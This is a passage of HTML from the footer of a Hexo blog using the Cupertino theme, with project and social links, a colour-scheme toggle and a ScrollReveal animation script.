                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>